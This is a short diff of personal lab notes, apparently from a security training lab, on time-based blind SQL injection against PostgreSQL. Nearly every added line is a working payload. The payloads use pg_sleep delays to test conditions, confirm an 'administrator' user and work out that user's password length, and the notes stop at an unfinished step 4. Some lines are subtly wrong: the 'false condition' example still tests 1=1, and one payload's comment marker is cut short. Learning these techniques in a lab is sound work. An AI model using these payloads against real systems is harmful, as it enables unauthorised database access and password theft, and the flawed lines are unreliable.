@@ -1,5 +1,18 @@
 Lab #15: 
 
-1. Causing the application to sleep
+1. Causing the application to sleep. There is a time delay of 10 seconds when the condition is true
 '; select pg_sleep(10)--
 '||pg_sleep(10)--
+
+Or use conditional statement
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--   --{ No time delay because the condtion is false
+
+2. Confirming that there is a user called administrator. 
+'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--
+
+3. The next step is to determine how many characters are in the password of the administrator user. 
+'; SELECT CASE WHEN (username='administrator' AND length(password)>19) THEN pg_sleep(5) ELSE pg_sleep(0) END from users-
+The password length is 20 character
+
+4. 
